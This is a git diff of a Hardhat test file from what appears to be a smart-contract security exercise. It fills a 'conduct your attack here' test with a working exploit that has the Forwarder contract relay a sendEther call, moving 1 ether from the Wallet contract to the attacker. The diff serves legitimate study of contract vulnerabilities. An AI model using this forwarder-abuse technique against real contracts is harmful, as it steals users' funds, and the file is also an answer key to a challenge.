@@ -2,6 +2,7 @@ const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
 const { expect } = require("chai");
 const { ethers } = require("hardhat");
 
+
 const WALLET_NAME = "Wallet";
 const FORWARDER_NAME = "Forwarder";
 const NAME = "Forwarder tests";
@@ -36,7 +37,13 @@ describe(NAME, function () {
       );
     });
 
-    it("conduct your attack here", async function () {});
+    it("conduct your attack here", async function () {
+     
+        let ABI = ["function sendEther(address destination, uint256 amount)" ];
+        let iface = new ethers.utils.Interface(ABI);
+        let data = iface.encodeFunctionData("sendEther", [attackerWallet.address,ethers.utils.parseEther("1")])
+        await forwarderContract.connect(attackerWallet).functionCall(walletContract.address, data)
+    });
 
     after(async function () {
       const attackerWalletBalanceAfter = await ethers.provider.getBalance(
